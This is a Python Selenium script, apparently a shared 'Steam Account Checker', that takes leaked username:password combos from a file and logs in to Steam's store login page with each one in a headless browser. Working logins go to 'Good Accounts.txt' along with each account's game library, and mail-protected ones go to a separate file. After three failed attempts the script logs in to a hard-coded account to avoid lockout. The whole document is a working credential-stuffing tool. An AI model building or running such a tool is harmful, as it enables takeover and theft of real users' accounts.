from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import re,time
import colorama
from colorama import Fore, Back, Style

colorama.init()

print(Fore.RED)
print( """\

╔═╗╔╦╗╔═╗╔═╗╔╦╗  ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
╚═╗ ║ ║╣ ╠═╣║║║  ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
╚═╝ ╩ ╚═╝╩ ╩╩ ╩  ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
Original: github.com/Galerici
actual: github.com/lilkdi/SteamAccountChecker
                                                                                                                         
                                                       
 """ )

howmanyentercorly = 3
correctaccount = "kutxyromero:123456"

reptdlyimpsbl = 0



unames = re.findall("\w{5,30}[@]?\w{1,10}[.]?\w{1,30}[:]\S+",open("accounts.txt","r", encoding="utf8").read())
unameslength = len(unames)

def correctaccountcalc(username):
    global reptdlyimpsbl
    options = webdriver.ChromeOptions()
    options.add_argument("--incognito")
    options.add_argument("--headless")
    options.add_argument("log-level=2")
    chrome = webdriver.Chrome(options=options)
    chrome.get("https://store.steampowered.com/login/")
    username = username.split(":")
    chrome.find_element_by_id("input_username").send_keys(username[0])
    chrome.find_element_by_id("input_password").send_keys(username[1])
    chrome.find_element_by_id("input_password").send_keys(Keys.ENTER)
    def w8():
        global isiterror,reptdlyimpsbl
        try:
            if (chrome.find_element_by_id("login_btn_wait").is_displayed()):
                time.sleep(0.3)
                w8()
                return 0
        except:
            time.sleep(2)
            reptdlyimpsbl = 0
            chrome.quit()
    w8()

def accountcalc(username, whichthe = 0):
    options = webdriver.ChromeOptions()
    options.add_argument("--incognito")
    options.add_argument("--headless")
    options.add_argument("log-level=2")
    chrome = webdriver.Chrome(options=options)
    chrome.get("https://store.steampowered.com/login/")
    username = username.split(":")
    chrome.find_element_by_id("input_username").send_keys(username[0])
    chrome.find_element_by_id("input_password").send_keys(username[1])
    chrome.find_element_by_id("input_password").send_keys(Keys.ENTER)
    isiterror = False
    def w8():
        global isiterror,reptdlyimpsbl
        try:
            if (chrome.find_element_by_id("login_btn_wait").is_displayed()):
                time.sleep(0.3)
                w8()
                return 0
            else:
                time.sleep(2)
                if len(chrome.find_element_by_id("error_display").text) > 2:
                    print("Account Bad  (" + str(whichthe) + "/" + str(unameslength) + ")")
                    reptdlyimpsbl += 1
                    chrome.quit()
                else:
                    time.sleep(0.5)
                    if len(chrome.find_elements_by_class_name("newmodal")) > 0:
                        print("Mail Protect  (" + str(whichthe) + "/" + str(unameslength) + ")")
                        open("mailprotectedaccounts.txt", "a").writelines(username[0] + ":" + username[1] + "\n")
                        reptdlyimpsbl += 1
                        chrome.quit()
        except:
            print("Account Good (" + str(whichthe) + "/" + str(unameslength) + ")")
            reptdlyimpsbl = 0
            print("Oyun Bilgileri Alınıyor")
            open("Good Accounts.txt", "a").writelines(username[0] + ":" + username[1] + "\n")
            time.sleep(2)
            chrome.get(chrome.find_element_by_xpath(
                "/html/body/div[1]/div[7]/div[1]/div/div[3]/div/div[3]/div/a[1]").get_attribute("href"))
            chrome.get(chrome.current_url + "/games/?tab=all")
            open("Good Accounts.txt", "a").writelines("{" + "\n")
            for gametext in chrome.find_elements_by_class_name("gameListRowItemName"):
                print(gametext.text)
                open("Good Accounts.txt", "a").writelines(gametext.text + "\n")
            open("Good Accounts.txt", "a").writelines("}" + "\n")
            open("Good Accounts.txt", "a").writelines("-----------------------" + "\n")
            chrome.quit()
    w8()

whichthe = 0
for username in unames:
    whichthe += 1
    if reptdlyimpsbl == howmanyentercorly:
        print("Performing Verification...")
        correctaccountcalc(correctaccount)
        print("Verification Ok")
        accountcalc(username,whichthe)
        kaçlıkombo = 0
    else:
        accountcalc(username,whichthe)

